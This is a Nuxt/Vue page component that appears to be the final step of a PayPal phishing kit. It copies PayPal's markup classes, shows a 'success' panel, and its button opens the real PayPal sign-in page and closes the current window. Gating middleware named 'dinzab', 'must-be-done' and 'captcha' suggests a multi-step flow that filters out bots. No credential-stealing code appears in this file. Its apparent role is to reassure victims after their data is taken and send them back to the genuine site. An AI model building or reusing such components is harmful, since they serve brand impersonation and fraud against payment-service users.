<script setup>
definePageMeta({
    middleware:['dinzab', 'must-be-done','captcha'],
    requireLogin: true
})
</script>
<script>
export default {
    methods: {
        redirect() {
            window.open('https://paypal.com/signin', '_blank')
            window.close()
        }
    }
}
</script>
<template>
    <Head>
        <Title>{{ $t('51') }}</Title>
    </Head>
    <section class="container main mx-auto mt-2 rounded bg-white w-100 lg:p-0 sm:w-[80%] md:w-[100%] lg:w-[70%] flex justify-center items-center" style="margin:0 auto!important">
        <div class="zeby1">
            <div class="containerz containerBordered">
                <header>
                    <div class="success"></div>
                </header>
                <div id="login" class="zebyMaskable p-1">
                    <div class="px-1">
                        <h1 class="pt-3 pb-3 text-center font-extrabold leading-none tracking-tight text-gray-900 text-lg md:text-2xl lg:text-3xl">{{ $t('53') }}</h1>
                    </div>
                    <div class="px-3 pb-3 pt-2">
                        <p class="sm:text-md md:text-md lg:text-md">{{ $t('52') }}
                        </p>
                    </div>
                </div>
                <div class="w-full flex flex-col justify-center">
                    <button v-on:click="redirect()" class=" text-center w-full bg-[#1040c1] rounded-3xl p-3 text-white font-bold transition duration-200 hover:bg-[#1040c1]">{{ $t('54') }}</button>
                </div>
                
            </div>
            
        </div>
        
    </section>
</template>
<style scoped>

</style>

